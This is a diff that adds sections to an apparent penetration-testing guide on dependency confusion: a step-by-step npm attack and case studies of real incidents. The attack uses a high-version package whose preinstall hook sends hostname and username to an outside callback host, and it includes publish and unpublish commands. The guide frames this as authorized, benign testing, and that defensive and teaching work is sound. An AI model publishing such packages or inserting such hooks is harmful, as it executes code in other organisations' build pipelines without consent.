@@ -187,6 +187,73 @@ PyPI (setup.py):
 ```
 > **If this → then that:** the callback comes from a **cloud CI egress** (GitHub Actions/GitLab/Jenkins ranges) → you have **RCE in their pipeline** (Critical). A callback from a **corp/dev IP** → RCE on a developer machine (still Critical). No callback after a reasonable window → the name may be reserved, resolution favours private, or it's not built often — re-check claimability/version.
 
+## 8.1 The full attack, end-to-end — leaked name → claimable → benign CI callback, start to finish
+
+> *In plain words:* every command above is a piece; this is the **whole attack as one authorized, responsible sequence** — the exact Birsan-style flow. It's detection-heavy and publish-light: you spend almost all your effort *confirming claimability read-only*, publish a **benign** beacon for a name you're **authorized** to claim, catch **one** callback, and **pull it down**. Nothing here exfiltrates or persists — the callback alone is the whole Critical.
+
+**Stage 0 — Recon: harvest an internal name (from a leaked front-end bundle, §2).**
+```bash
+$ grep -oE '@[a-z0-9._-]+/[a-z0-9._-]+' app.bundle.js | sort -u
+  @acme/config          # org-specific, not on npm?  -> candidate
+  @acme/telemetry       # candidate
+  @sentry/browser       # public package, ignore
+  react                 # public, ignore
+```
+
+**Stage 1 — Claimability: is the name (and the scope) unclaimed on the PUBLIC registry? (read-only, §4).**
+```bash
+$ curl -s -o /dev/null -w '%{http_code}\n' https://registry.npmjs.org/@acme%2Fconfig
+  404                   # UNCLAIMED on npm = you can publish it = CLAIMABLE
+$ curl -s -o /dev/null -w '%{http_code}\n' https://registry.npmjs.org/-/org/acme
+  404                   # the @acme SCOPE is UNRESERVED = EVERY @acme/* they use is confusable (§5)
+```
+> **Verdict:** an internal name their bundle references that **404s publicly**, in an **unreserved scope** — a textbook dependency-confusion candidate. Still just a *lead* until a build calls back.
+
+**Stage 2 — Build a BENIGN higher-version beacon package (authorized name only, §7).** The install hook does exactly one thing — phone home with non-sensitive context:
+```json
+// package.json  — version 99.99.99 beats their private 1.x (highest-version-wins, §6)
+{ "name": "@acme/config", "version": "99.99.99",
+  "scripts": { "preinstall": "node beacon.js" } }
+```
+```js
+// beacon.js — the ENTIRE payload: a token + where it ran. No env dumps, no files, no shell, no persistence.
+const https = require('https'), os = require('os');
+https.get(`https://k7f2p.oast.pro/?t=DCPOC&h=${os.hostname()}&u=${os.userInfo().username}`);
+```
+
+**Stage 3 — Publish (authorized), then wait for their next build.**
+```bash
+$ npm publish --access public
+  + @acme/config@99.99.99          # now the public registry has a higher version than their private one
+```
+
+**Stage 4 — The callback: their CI resolved YOUR package and ran the hook.**
+```
+[your interactsh listener]
+  HTTP GET  k7f2p.oast.pro  ?t=DCPOC&h=fv-az417-3&u=runner   from 20.55.x.x
+                                    |            |                 (a GitHub-Actions egress range)
+                                    |            (user "runner")
+                                    (hostname "fv-az417-3" — an Azure-hosted GitHub Actions runner)
+```
+> The token proves it's *your* package; the `runner`/`fv-az…` hostname + the GitHub-Actions IP range prove it ran **inside their CI/CD** — i.e. **remote code execution in the build**, where the cloud IAM role, `NPM_TOKEN`, signing keys, and source live (§12).
+
+**Stage 5 — UNPUBLISH immediately, then report.**
+```bash
+$ npm unpublish @acme/config@99.99.99 --force     # (or `npm deprecate` if unpublish is blocked); record the window
+```
+Report at once so they **reserve the `@acme` scope** and fix resolution (`--index-url`, scope→registry mapping, hashed lockfiles, §16).
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  recon          -> an internal name the org uses privately (the nickname)
+Stage 1  claimability    -> it 404s publicly AND the scope is unreserved (you can register it) — still only a LEAD
+Stage 2  benign package  -> a higher-version public copy whose install hook does ONE harmless callback
+Stage 3  publish          -> resolution now has a higher version on the public side (highest-version-wins)
+Stage 4  CI callback      -> the token+CI-hostname from their build = RCE in the pipeline = the finding (Critical)
+Stage 5  unpublish+report -> benign, reverted, disclosed so they reserve the namespace
+```
+The *same arc* re-skins per ecosystem: swap Stage 1's npm scope check for a **PyPI `/pypi/<name>/json` 404** (pip `--extra-index-url` highest-version-wins is the classic, §6), or swap the whole thing for **repo-jacking** a freed `github.com/<user>` in a `go.mod` (§10) — Stages 4/5 (benign callback, unpublish, report) never change.
+
 ---
 
 # PART IV — RELATED SUPPLY-CHAIN TECHNIQUES
@@ -240,6 +307,29 @@ PROPAGATION: a poisoned build artifact ships to downstream users -> supply-chain
 DEV MACHINE: a callback from a workstation -> RCE on a developer -> lateral movement risk.
 ```
 > **If this → then that:** callback from CI → report **Critical RCE in the build pipeline** and *describe* the reachable secrets/propagation (don't harvest them). The benign execution proof + the environment context (hostname) is enough to establish full impact.
+
+---
+
+# Real-world dependency-confusion case studies (learn the pattern, not just the payload)
+
+> Each is a documented landmark. Read them for the **shape** — a public package outranking a private one of the same name — and note how the fix is always the same: **reserve the namespace** and pin resolution to the private source.
+
+### Case 1 — Alex Birsan (Feb 2021): the research that named the class
+- **What:** in authorized testing, Birsan achieved code execution inside the build systems of **Apple, Microsoft, PayPal, Shopify, Netflix, Tesla, Uber, Yelp and 30+ other major firms** — earning **$130,000+** in bug bounties — using nothing but **benign DNS/HTTP callbacks** and, in most cases, only **publicly-leaked internal package names** (no auth, no traditional exploit).
+- **Mechanism:** he published public packages matching each org's private names with a high version; the resolvers (notably pip `--extra-index-url` and unscoped/unreserved npm names) **preferred the higher public version**, and the install hook phoned home — exactly the §8.1 flow.
+- **Lesson:** this is the reference method and the reference *restraint* — a hostname beacon is a complete Critical; the value is in **detection breadth + a benign proof**, never a payload.
+
+### Case 2 — The copycat flood (Feb 2021): the class is trivially weaponizable
+- **What:** within **48 hours** of Birsan's disclosure, Sonatype flagged **275+ copycat npm packages** imitating the technique; over the following weeks the count climbed toward **~10,000** across npm and PyPI (a reported ~7000% week-over-week spike). Some were "vigilante" awareness packages; others were **outright malicious**, targeting names tied to **Amazon, Zillow, Slack** and exfiltrating `~/.bash_history` and `/etc/shadow`.
+- **Mechanism:** the attack needs no skill to reproduce — publish a higher-version public package under a leaked internal name — so disclosure triggered an immediate mass land-grab of unreserved names.
+- **Lesson:** the window between "your internal name leaks" and "someone claims it" is *hours*. Reserving namespaces is urgent, not theoretical — and it's why your report should stress **defensive reservation** (§16).
+
+### Case 3 — PyTorch / `torchtriton` (Dec 25–30, 2022): dependency confusion in the wild
+- **What:** a malicious **`torchtriton`** package was uploaded to **public PyPI** with the same name as a dependency **PyTorch-nightly shipped from its own private index**. Because pip preferred the public PyPI copy, anyone installing the nightly build in that window got the malicious one; its binary **exfiltrated env vars, hostname, `/etc/passwd`, `~/.ssh`, and `~/.gitconfig`**. (PyTorch *stable* users were unaffected.)
+- **Mechanism:** textbook public-over-private resolution — the exact risk this kit tests — but as a real attack, not authorized research.
+- **Lesson:** PyTorch's fix is the remediation you should recommend verbatim — they **renamed** the dependency to `pytorch-triton` **and registered a placeholder `torchtriton` on PyPI to reserve the name** (§16). "Reserve the public name" isn't bureaucratic advice; it's what stopped the bleeding here.
+
+> **The through-line:** the reported/observed impact is **code execution where the build's secrets live**, the "bug" is a resolver preferring a public package, and the fix is **namespace reservation + private-only resolution**. Your job is to prove the *first* with a benign callback (§8.1) and recommend the *last* (§16).
 
 ---
 
